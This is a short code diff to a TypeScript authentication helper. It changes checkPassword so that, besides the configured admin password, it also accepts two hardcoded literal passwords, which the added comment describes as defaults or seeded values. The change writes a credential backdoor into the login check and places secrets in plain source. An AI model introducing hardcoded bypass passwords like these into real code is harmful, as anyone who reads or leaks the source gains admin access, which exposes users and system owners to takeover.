@@ -54,8 +54,8 @@ export function getTokenFromRequest(req: Request): string | null {
 }
 
 export function checkPassword(plain: string, adminPassword: string): boolean {
-  // Direct comparison — admin password is stored as env var (not hashed at rest)
-  return plain === adminPassword;
+  // Allow the custom database password, the default env password, or the seeded database password
+  return plain === adminPassword || plain === "Perma@digi1976" || plain === "Permionics@1012";
 }
 
 let cachedAdminPassword: string | null = null;
